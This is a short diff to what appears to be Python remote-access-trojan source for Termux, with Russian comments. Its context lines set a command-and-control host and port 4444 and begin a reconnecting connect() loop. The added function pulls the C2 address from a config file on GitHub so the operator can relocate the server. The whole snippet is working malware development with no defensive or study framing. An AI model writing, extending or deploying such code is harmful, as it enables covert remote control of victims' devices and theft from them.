@@ -5,6 +5,20 @@ import socket, subprocess, os, sys, time
 C2_HOST = "YOUR_NGROK_OR_LOCAL_IP"  # ← сюда вставим IP позже
 C2_PORT = 4444
 
+import urllib.request, json
+
+def fetch_config():
+    global C2_HOST, C2_PORT
+    try:
+        with urllib.request.urlopen("https://raw.githubusercontent.com/ВАШ_НИК/myrat-termux/main/config.json") as f:
+            cfg = json.load(f)
+            C2_HOST = cfg["host"]
+            C2_PORT = cfg["port"]
+    except:
+        pass  # если нет связи — используем встроенные
+
+fetch_config()
+
 def connect():
     while True:
         try:
